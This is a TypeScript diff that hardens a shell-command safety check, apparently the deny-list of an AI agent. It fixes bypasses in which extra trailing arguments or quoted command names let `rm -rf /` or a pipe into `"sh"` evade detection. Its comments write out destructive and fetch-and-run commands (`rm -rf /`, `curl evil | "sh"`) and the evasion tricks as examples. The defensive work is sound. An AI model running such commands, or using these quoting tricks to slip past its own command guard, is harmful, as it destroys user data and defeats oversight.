@@ -111,11 +111,18 @@ function shellSegments(command: string): string[] {
       }
     }
 
+    // Capture only the `-c` ARGUMENT — the quoted body or the single unquoted
+    // token — not the rest of the line. A greedy `(.+)$` would swallow trailing
+    // args (`sh -c 'rm -rf /' --login`), leaving the quotes unmatched so the head
+    // reads `'rm` and slips past the destructive check.
     const dashC =
-      /\b(?:sh|bash|zsh|dash|ash|ksh|env)\b[^|;&]*?\s-c\s+(.+)$/u.exec(seg);
+      /\b(?:sh|bash|zsh|dash|ash|ksh|env)\b[^|;&]*?\s-c\s+(?:'([^']*)'|"([^"]*)"|(\S+))/u.exec(
+        seg
+      );
+    const dashCArg = dashC?.[1] ?? dashC?.[2] ?? dashC?.[3];
 
-    if (dashC?.[1] !== undefined) {
-      out.push(unquote(dashC[1])); // the string handed to the interpreter
+    if (dashCArg !== undefined) {
+      out.push(dashCArg); // the string handed to the interpreter (already unquoted)
     }
   }
 
@@ -127,8 +134,10 @@ function shellSegments(command: string): string[] {
  *  so `build && rm -rf /`, `echo $(rm -rf x)`, `find . -exec rm {} +`, and
  *  `sh -c 'rm -rf /'` are all caught (the critical-deny must hold in EVERY mode). */
 export function isDestructiveShell(command: string): boolean {
+  // unquote the head: the shell strips quotes, so `"rm" -rf /` runs `rm` — the
+  // check must see `rm`, not `"rm"`.
   return shellSegments(command).some((s) =>
-    DESTRUCTIVE_HEADS.has(commandHead(s))
+    DESTRUCTIVE_HEADS.has(unquote(commandHead(s)))
   );
 }
 
@@ -144,7 +153,8 @@ export function pipesToShell(command: string): boolean {
     const stages = cmd.split("|");
 
     for (let i = 1; i < stages.length; i += 1) {
-      if (SHELL_INTERPRETERS.has(commandHead(stages[i] ?? ""))) {
+      // unquote: `curl evil | "sh"` still pipes into sh.
+      if (SHELL_INTERPRETERS.has(unquote(commandHead(stages[i] ?? "")))) {
         return true;
       }
     }
